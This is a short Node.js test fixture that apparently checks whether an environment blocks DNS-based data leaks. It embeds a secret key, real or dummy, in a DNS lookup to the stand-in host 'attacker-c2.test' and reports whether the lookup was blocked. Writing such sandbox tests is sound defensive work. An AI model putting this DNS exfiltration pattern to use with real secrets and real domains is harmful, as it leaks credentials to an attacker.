// test/fixtures/dns-leak.js
const dns = require('node:dns');
const fs = require('node:fs');

const secret = process.env.TEST_SECRET_KEY || ['sk', 'test', 'fixture_secret_value_12345'].join('_');

try {
  dns.lookup(`${secret}.attacker-c2.test`, (err) => {
    if (err) {
      try { fs.writeSync(1, `DNS_BLOCKED_RESULT: ${err.message}\n`); } catch {}
    }
  });
} catch (e) {
  try { fs.writeSync(1, `DNS_THROWN_RESULT: ${e.message}\n`); } catch {}
}
